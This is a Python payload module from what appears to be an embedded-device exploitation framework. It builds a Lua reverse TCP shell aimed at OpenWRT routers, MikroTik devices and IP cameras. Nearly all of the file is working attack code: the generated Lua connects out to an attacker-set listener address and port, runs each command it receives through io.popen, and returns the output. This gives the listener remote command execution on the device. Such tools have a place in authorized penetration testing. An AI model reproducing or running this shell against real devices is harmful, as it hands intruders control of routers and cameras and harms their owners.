"""Lua Reverse TCP Shell.

Target: dispositivos OpenWRT, roteadores com Lua (MikroTik Scripting via Lua),
câmeras IP com Lua interpreter embutido.
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Lua Reverse TCP",
        "description": "Lua reverse TCP shell for OpenWRT/embedded Lua targets.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        lua = f"""local socket = require("socket")
local host, port = "{lhost}", {lport}
local c = socket.connect(host, port)
while true do
    local cmd, err = c:receive("*l")
    if not cmd then break end
    local f = io.popen(cmd .. " 2>&1", "r")
    local out = f:read("*a")
    f:close()
    c:send(out)
end
c:close()"""
        return lua.encode()
